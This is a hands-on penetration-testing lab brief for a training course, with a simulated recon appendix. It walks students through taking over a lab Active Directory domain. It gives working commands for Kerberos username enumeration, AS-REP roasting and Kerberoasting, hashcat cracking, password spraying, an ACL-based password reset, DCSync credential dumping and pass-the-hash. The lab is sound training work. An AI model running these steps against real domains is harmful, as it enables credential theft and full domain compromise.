LAB 4 — Active Directory: Enumeration, Lateral Movement & Persistence
Duration: 2h30 · Teams of 3 · Deliverable: 4 findings + annotated BloodHound graph

Scenario
You have compromised a Linux host in the client's DMZ. It is multi-connected: one interface faces the perimeter (The Bridge Adapter), the other sits on the internal network 10.10.10.0/24 (The NAT Network LabInternal that you need to create if not done). You are working from that host (your Debian VM) — Exegol is your toolkit on it.

The internal network contains a Windows domain, corp.local. You have no domain credentials.

Your objective: full control of the domain.

You start with one document: the reconnaissance briefing in Appendix A at the end of this brief. Read it before touching a keyboard.

How the hints work
Every phase below has the same structure:

Task        — what you must achieve
Hint 1      — a nudge. Read it after 5 minutes of trying.
Hint 2      — most of the answer. Read it after 10 minutes.
Walkthrough — the exact commands. Read it after 15 minutes, no guilt.
One rule you must respect: whatever you open, you must still be able to answer why does this work?.

Schedule
Phase	Content	Time
1	Unauthenticated enumeration	25 min
2	First credentials	30 min
3	Kerberoasting	20 min
4	BloodHound — collection and graph analysis	35 min
5	Executing the path	25 min
6	Findings	15 min
Scope
Target	Status
10.10.10.0/24 — the internal domain	In scope
dc01.corp.local — 10.10.10.10	In scope
The Linux host you are working from	Out of scope — workstation only
Anything outside 10.10.10.0/24	Out of scope
Phase 0 — Two minutes of setup
mkdir lab4 && cd lab4

# The DC is the only DNS server that knows corp.local, but your resolver points elsewhere. Kerberos works on names, not addresses.
grep -q dc01.corp.local /etc/hosts || echo "10.10.10.10  dc01.corp.local corp.local DC01" >> /etc/hosts

# Kerberos rejects any clock skew above 5 minutes. A suspended VM drifts, and KRB_AP_ERR_SKEW looks exactly like a wrong password.
date -u '+%H:%M:%S UTC'

nxc smb 10.10.10.10
The last command must return the hostname, the domain and the OS build. If it does not, stop and fix that before going further.

Phase 1 — Unauthenticated enumeration (25 min)
1.0 — Try the old way first, so you know why it is dead
nxc smb 10.10.10.10 -u '' -p '' --users
Look carefully at what happens. The session opens — you get a green [+]. And then no users come back.

The anonymous bind is allowed; the SAM enumeration behind it is not. Since Windows Server 2016, remote calls to the SAM interface are filtered by a security descriptor (RestrictRemoteSam) that grants access to Administrators only. And even where that descriptor allows Everyone, an anonymous session is not a member of Everyone — Windows removed that mapping long ago.

So rpcclient -U "" -N and enumdomusers are not going to save you either. Write this down as a finding observation, not a failure.

1.1 — Enumerate usernames through Kerberos instead
The KDC answers differently for an account that exists and one that does not, and it does so before any credential is presented:

Account state	KDC response
Does not exist	KDC_ERR_C_PRINCIPAL_UNKNOWN
Exists, pre-auth required	KDC_ERR_PREAUTH_REQUIRED
Exists, pre-auth disabled	An AS-REP is returned directly
Exists but disabled	KDC_ERR_CLIENT_REVOKED
That third row is not a detail. Keep it in mind for Phase 2.

The consequence: Kerberos tells you whether a name exists. It will never tell you a name you did not think of. Which is why the next twenty minutes go into building a list, not into running a tool.

1.2 — Derive human account names
Task. Turn the five people in section 3 of the recon briefing into candidate usernames.

Hint 1

Section 4 of the briefing puts two real addresses next to two real names. Put them side by side. What transformation turns John Doe into jdoe?

Hint 2

First initial, then last name, lowercase, no separator.

Apply it to all five. Then add the conventions the client could have used instead — john.doe, doej, john — because you are inferring from two samples, not reading a policy document. Wrong candidates cost nothing: the KDC discards them in microseconds.

Walkthrough

cat > people.txt << 'EOF'
John Doe
Mike Smith
Tom Brown
Sarah Connor
David Green
EOF

# observed convention: first initial ($1 -> first field, 1 -> the position of first char to extract, 1 -> number of chars to retrieve) + last name -> you will get jdoe for the first user
awk '{ print tolower(substr($1,1,1) $2) }' people.txt > users.txt

# plausible alternatives, kept as deliberate noise -> you will get john.doe, john, doe and doej
awk '{ print tolower($1 "." $2); print tolower($1); print tolower($2);
       print tolower($2 substr($1,1,1)) }' people.txt >> users.txt
1.3 — Derive service account names
Task. Candidate names for the service accounts.

Hint 1

The job posting in section 5 states a naming standard outright. The DNS table in section 2 tells you which applications exist. You need both.

Hint 2

The standard is svc_<application>. The applications are the DNS names: intranet, backup, sql01, dc01, vpn, mail.

One subtlety worth ten seconds of thought: hostnames carry numbers because there may be several of them. Accounts usually do not. So for sql01, generate both svc_sql01 and svc_sql.

Walkthrough

cat > hosts.txt << 'EOF'
dc01
intranet
backup
sql01
vpn
mail
EOF

while read -r h; do
    echo "svc_${h}"           # raw hostname
    echo "svc_${h%%[0-9]*}"   # trailing digits stripped for dc01 and sql01
done < hosts.txt >> users.txt

printf 'administrator\nadmin\nguest\nkrbtgt\ntest\ndemo\n' >> users.txt # add some common users
sort -u users.txt > corp_users_candidates.txt
rm -f users.txt
wc -l < corp_users_candidates.txt    # expect around 39
1.4 — Test the list against the KDC
Hint 1

kerbrute userenum takes a domain, a KDC and a wordlist. Run kerbrute userenum --help if you need the flag names.

Hint 2

Kerbrute's output is written for a human reading a terminal: a banner, timestamps, and a line format no other tool can parse. Everything you run afterwards expects one bare username per line.

Do not skip the parsing step. Feeding raw Kerbrute output to NetExec produces KDC_ERR_C_PRINCIPAL_UNKNOWN on every line, and you will lose twenty minutes convincing yourself the domain is broken.

Walkthrough

kerbrute userenum --dc 10.10.10.10 -d corp.local corp_users_candidates.txt | tee kerbrute_raw.txt

grep "VALID USERNAME" kerbrute_raw.txt | awk '{print $NF}' | cut -d'@' -f1 | sort -u > valid_users.txt # retrieve the last field, remove the @corp.local and sort the output

cat valid_users.txt
Checkpoint 1 — all four must be true
[ ] corp_users_candidates.txt holds roughly 39 candidates
[ ] kerbrute_raw.txt is saved as evidence
[ ] valid_users.txt holds one bare username per line — no timestamps, no @corp.local
[ ] You can state how many you tested and how many were valid
If valid_users.txt is empty:

Check	Command
Is the DC reachable?	nxc smb 10.10.10.10
Is port 88 open?	nmap -p 88 10.10.10.10
Did the grep match?	head kerbrute_raw.txt
Questions for your report
You tested ~39 candidates and only a minority came back. What would a generic 10-million-entry username list have done here — and what would it have failed to find?
Two well-known accounts did not come back as valid even though they certainly exist. Which ones, and what does the KDC response table tell you about why?
Phase 2 — First credentials (30 min)
2.1 — AS-REP roasting
Task. Obtain a credential without having any.

Hint 1

Re-read the KDC response table in 1.1. One row describes an account whose AS-REP you can get without proving anything. Which NetExec flag harvests those?

Hint 2

An account with DONT_REQUIRE_PREAUTH gets an AS-REP from the KDC without the client ever proving it knows the password. That AS-REP is encrypted with the account's password hash — so crack the AS-REP, get the password.

Feed it your whole valid user list with an empty password.

Walkthrough

nxc ldap 10.10.10.10 -u valid_users.txt -p '' --asreproast asrep.txt
cat asrep.txt
2.2 — Crack it. Twice.
Do the first run exactly as written, even though it will fail. The failure is the point, and the output goes in your report.

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
Note the Status line and the Progress line. Then:

Hint 1

Your dictionary holds 14 million passwords and none of them matched. That does not mean the password is strong. It means the password is a dictionary word that somebody modified. What does hashcat use to apply modifications to every word of a list?

Hint 2

Rules. best64.rule applies ~80 transformations to each candidate — appending digits, capitalising, reversing, truncating — which turns 14 million candidates into roughly 1.1 billion.

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Record both runs side by side in your report. The Progress figures — 14 344 384 against 1 104 517 568 — are the finding. Not the password.

2.3 — Read the policy before you spray
With your new credentials:

nxc smb 10.10.10.10 -u <USER> -p '<PASS>' --pass-pol
Three numbers matter. Write them down before continuing.

Hint 1

Lockout threshold, observation window, and one flag that tells you whether passwords must mix character classes at all.

Hint 2

Account Lockout Threshold is how many failures lock an account. Reset Account Lockout Counter is how long the counter remembers them. Domain Password Complex: 0 means complexity is off across the whole domain — that is a finding in its own right, and it is the root cause of everything else you are about to do.

There is a fourth line worth noticing: Domain Password Lockout Admins. Work out what it means for a spray.

2.4 — Spray
One password, one round.

Hint 1

You have a lockout threshold. How many attempts per account can you afford, and which accounts should you leave out entirely?

Hint 2

Leave out every account you already own — spraying those burns a failure counter for nothing. Seasonal patterns are the first thing to try against a domain with complexity disabled: Summer2026!, Winter2025!, Corp2026!.

grep -v -f <(echo "<USER_YOU_OWN>") valid_users.txt > spray_targets.txt
nxc smb 10.10.10.10 -u spray_targets.txt -p '<CANDIDATE>' --continue-on-success
Checkpoint 2
[ ] At least one credential obtained without credentials
[ ] Both hashcat runs captured, with their Progress lines
[ ] Lockout threshold and observation window written down
[ ] Spray results documented, successes and failures
Phase 3 — Kerberoasting (20 min)
3.1 — Request a ticket for every SPN
Task. Escalate from your current account to a better one.

Hint 1

Any authenticated user can request a service ticket for any SPN in the domain. Which NetExec flag does that, and what does it give you back?

Hint 2

The TGS is encrypted with the service account's password hash, so you crack it offline — the KDC never sees the attempt. Request every SPN you can and look at what comes back.

nxc ldap 10.10.10.10 -u <USER> -p '<PASS>' --kerberoasting kerb.txt
grep -c '^\$krb5tgs' kerb.txt
3.2 — You will get more than one hash. Only one will fall.
This is the most important twenty minutes of the lab, so read this before you start burning CPU.

A roastable hash is a hypothesis, not a compromise. Service accounts with machine-generated passwords are uncrackable in any realistic budget, and part of your job is deciding when to stop.

Hint 1

rockyou did not work last time without help, and these passwords are not dictionary words at all. What do you actually know about these accounts that you could turn into a wordlist?

Hint 2

You know their names, the domain name, and the applications they serve. Build a small list from that, in several capitalisations, and bolt a four-digit mask onto the end — service account passwords can end in a year.

That is a hybrid attack: -a 6 means wordlist on the left, mask on the right.

cat > ctx.txt << 'EOF'
backup
Backup
BACKUP
corp
Corp
intranet
Intranet
sql
Sql
svc
Svc
EOF

hashcat -m 13100 kerb.txt -a 6 ctx.txt '?d?d?d?d'
3.3 — Knowing when to stop
For the hash that did not fall, you may try rockyou with best64. It takes about seven minutes and it will not succeed.

Run it if you want to see it, but start it in a second terminal and keep working. Status: Exhausted next to Recovered: 1/2 is a normal, professional outcome — it means the attack completed and the account resisted.

The pwdLastSet value NetExec printed for each account is your prioritisation criterion in a real engagement. An account whose password has not changed in six years is worth CPU time. One rotated last month usually is not.

Checkpoint 3
[ ] Number of SPN accounts found, and their names
[ ] One password cracked, one resisted — both documented
[ ] You can explain why cracking a TGS generates no failed logons
Phase 4 — BloodHound (35 min)
4.1 — Collect
bloodhound-ce.py -u <USER> -p '<PASS>' -d corp.local -dc dc01.corp.local -ns 10.10.10.10 -c All --zip
Use bloodhound-ce.py. Never the legacy bloodhound.py — the ingest fails almost silently and you will lose half an hour.

bloodhound-ce      # UI on http://localhost:1030
The admin password is displayed once, at first start. Write it down immediately. If you lose it: bloodhound-ce-reset.

Upload the zip through the UI and wait for ingestion to finish before querying anything.

4.2 — Find the path
Task. Find the route from the account you own to full domain control.

Hint 1

Mark your cracked service account as Owned first — several pathfinding queries only work from owned nodes.

Then try Shortest Path to Domain Admins from Owned. Read what it returns, and read the objective statement at the top of this document again.

Hint 2

The Domain Admins query comes back empty. That is not your mistake and it is not a broken collection.

Domain Admins is a means, not an end. Full domain control means the ability to replicate the directory — and that right can be granted to any account, with no group membership at all. An account holding it is not a Domain Admin and will never appear in that query.

Change your target. Use the domain node — CORP.LOCAL — as the destination of your pathfinding instead of the group.

Walkthrough

In the Pathfinding tab: start node = the account you own, end node = CORP.LOCAL. Two edges appear. Click each one and read the help panel — BloodHound explains the abuse and gives you the command.

4.3 — Read the graph properly
You can see at least one edge that is not part of your path: a built-in group holding rights over the same target.

Do not ignore it and do not take it. Work out whether it is exploitable — check whether anything is actually a member of that group — and say so in your report. Distinguishing a real path from a theoretical one is the skill being assessed here.

Checkpoint 4
[ ] Collection ingested, graph populated
[ ] Path found, screenshot annotated with both edges named
[ ] You can explain each edge in one sentence, in offensive terms
[ ] The non-exploitable edge is identified and justified
"BloodHound said so" is not an explanation and scores zero.

Phase 5 — Executing the path (25 min)
5.1 — Abuse the ACL
Hint 1

Click the edge in BloodHound. The help panel names the tools and gives the syntax. You can use net rpc to compromise the accound, but bloodyAD is installed and we will use it instead.

Hint 2

GenericAll over a user object means every right over it, including resetting the password without knowing the current one. This is not a vulnerability — it is a permission somebody granted on purpose and forgot about.

bloodyAD -u <USER> -p '<PASS>' -d corp.local --host dc01.corp.local set password <TARGET> '<NEW_PASSWORD>'
Record the original state in your cleanup table before you run this. You are changing a production account's password. In a real engagement this is the kind of action that requires written client approval.

Confirm it worked:

nxc smb 10.10.10.10 -u <TARGET> -p '<NEW_PASSWORD>'
5.2 — DCSync
Hint 1

The second edge in your path names the technique. Impacket has a tool for it.

Hint 2

DCSync abuses the replication protocol: your account asks the DC to replicate account secrets, exactly as another DC would. No code runs on the target, nothing is written to disk.

secretsdump.py corp.local/<TARGET>:'<NEW_PASSWORD>'@10.10.10.10 -just-dc-ntlm
Do it once. It is among the most heavily monitored actions on a domain controller, and the remediation — rotating krbtgt twice — is something you only get to demonstrate once per engagement.

Record the krbtgt hash. That is your primary objective.

Then look at the dump carefully and answer three questions in your report:

Three user accounts share an identical hash. What does that prove about the algorithm, and what does it confirm about Phase 2?
One account's hash is 31d6cfe0d16ae931b73c59d7e0c089c0. Look it up. What is it, and why will you recognise it for the rest of your career?
One entry ends with $. What kind of account is that, and why does it have a hash at all?
5.3 — Pass-the-hash
Your compromised account is not a Domain Admin — it never was. So prove domain control another way.

Hint 1

Your dump contains the Administrator hash. NTLM authentication never uses the password itself.

Hint 2

The hash is the credential. You do not need to crack it.

nxc smb 10.10.10.10 -u Administrator -H <HASH>
nxc smb 10.10.10.10 -u Administrator -H <HASH> --shares
Look for (admin) at the end of the line — older documentation calls this (Pwn3d!).

Checkpoint 5
[ ] Password reset performed and logged in the cleanup table
[ ] krbtgt hash recorded
[ ] Pass-the-hash successful, (admin) captured in a screenshot
[ ] Every artefact you created is in the cleanup table
Phase 6 — Findings (15 min)
Four findings, in the report template.

Finding	Subject
F-00	Domain password policy — complexity disabled
F-01	The technique that gave you your first credential
F-02	The ACL misconfiguration — your BloodHound path
F-03	Domain-wide credential compromise via replication rights
Each finding needs:

[ ] CVSS v3.1 vector string, complete
[ ] Reproducible steps — runnable by someone who was not in this room
[ ] Evidence: before/after, annotated BloodHound screenshot
[ ] Business impact — not "an attacker could escalate privileges"
[ ] Specific remediation — not "apply patches"
[ ] ATT&CK technique IDs, sub-technique level
[ ] A cleanup table entry for every artefact
Reference
Resource	URL
The Hacker Recipes — AD	thehacker.recipes/ad
NetExec	github.com/Pennyw0rth/NetExec
BloodHound CE	bloodhound.specterops.io
bloodyAD	github.com/CravateRouge/bloodyAD
hashcat rule-based attack	hashcat.net/wiki/doku.php?id=rule_based_attack
ATT&CK — Credential Access	attack.mitre.org/tactics/TA0006/
ATT&CK — Lateral Movement	attack.mitre.org/tactics/TA0008/
Appendix A — Reconnaissance Briefing
This is the document referred to throughout the brief. It simulates the output of the reconnaissance phase conducted against this client, in the same form as your own LAB 1 deliverable.

Handed to you at the start of LAB 4. This is your only starting material.

This document simulates the output of a reconnaissance phase conducted against the client before your engagement — exactly the deliverable you produced in LAB 1. In a real engagement, this is what the previous consultant hands you on day one.

It contains no credentials and no account names. Everything you need is here, but nothing is given directly. Your first task is to turn this page into a list of usernames to test.

1. Engagement context
Client	CORP
Phase	Internal — post-foothold
Starting position	Shell on a Linux host in the DMZ, no domain credentials
Internal range in scope	10.10.10.0/24
Identified domain	corp.local
Identified domain controller	dc01.corp.local — 10.10.10.10
2. DNS records collected
Recovered from the internal resolver during the DMZ phase (zone walk, reverse lookups, and hostnames observed in HTTP headers).

Hostname	Record	Comment
dc01.corp.local	A → 10.10.10.10	Domain controller, DNS server
intranet.corp.local	CNAME → dc01	Internal web portal, IIS banner observed
backup.corp.local	A → 10.10.10.10	Backup console referenced in an internal page
sql01.corp.local	A → 10.10.10.10	Database host, port 1433 referenced
vpn.corp.local	A → (external)	Remote access gateway
mail.corp.local	A → (external)	Mail gateway
Several names resolve to the same address. This is a lab consolidation, not a mistake — treat each name as a distinct application.

3. Personnel identified
Collected from the company website, a professional social network, and the metadata of three PDF documents published on the public site.

Name	Role	Source
John Doe	Operations Manager	Company website, "Our team"
Mike Smith	IT Administrator	Professional network profile
Tom Brown	Sales	Professional network profile
Sarah Connor	Finance	PDF metadata (Author field)
David Green	Support technician	PDF metadata (Creator field)
4. Email address convention
Two addresses were recovered in clear text during passive collection:

jdoe@corp.local        (contact form auto-reply)
tbrown@corp.local      (sales PDF footer)
This is the single most valuable line in this document. Read it twice.

5. Job posting — extract
Published on a public recruitment site, dated four months ago. Reproduced verbatim from the section relevant to the engagement.

System and Network Administrator — CORP

[...] You will be responsible for the lifecycle of our Active Directory service accounts, which follow our internal svc_<application> naming standard, as well as for the separation between standard and administrative accounts introduced during our last audit. [...]

Environment: Windows Server, IIS, Microsoft SQL Server, internal intranet portal, nightly backup jobs.

6. What is not known
Stated explicitly so you do not waste time looking for it in this document.

Unknown	How you will obtain it
Valid account names	Phase 1 — derive and test
Password policy and lockout threshold	Phase 2 — requires valid credentials
Domain group memberships	Phase 3 — authenticated enumeration
Administrative account naming	Phase 3 — authenticated enumeration
Any password	Phases 2 and 3
7. Attack surface summary
Asset	Exposure	Priority	Rationale
dc01.corp.local	Kerberos (88), LDAP (389), SMB (445)	High	Sole domain controller; Kerberos is reachable without credentials
Naming conventions	Documented publicly	High	Enables targeted account enumeration
Service accounts	Standard confirmed in job posting	High	Service accounts are historically weakly protected
Account separation	Mentioned but unverified	Medium	Suggests privileged accounts exist under a derived name
End of reconnaissance briefing.

